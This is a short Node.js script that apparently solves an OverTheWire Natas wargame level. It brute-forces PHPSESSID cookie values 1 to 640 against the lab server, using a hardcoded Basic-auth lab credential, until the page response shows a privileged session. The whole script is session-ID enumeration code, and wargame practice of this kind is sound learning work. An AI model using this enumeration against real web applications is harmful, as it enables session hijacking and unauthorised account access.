const request = require("request")
const { parse } = require("node-html-parser")

const url = "http://natas18.natas.labs.overthewire.org/index.php"

async function serveRequest(sid) {
  return new Promise((res, rej) => {
    request.post(
      {
        url: url,
        headers: {
          Cookie: `PHPSESSID=${sid}`,
          Authorization:
            "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==",
        },
      },
      function optionalCallback(err, httpResponse, body) {
        if (err) {
          console.log(err)
          res(-1)
        }
        res(body)
      }
    )
  })
}

function getMessage(htmlStr) {
  const root = parse(htmlStr)
  return root.querySelector("#content").firstChild.text
}

function doesUserExist(htmlStr) {}

;(async function () {
  for (var i = 1; i <= 640; i++) {
    const r = await serveRequest(i)

    console.log("testing session id : ", i)
    if (getMessage(r).length !== 93) {
      console.log("session is found : ", i)
      return
    }
  }
})()
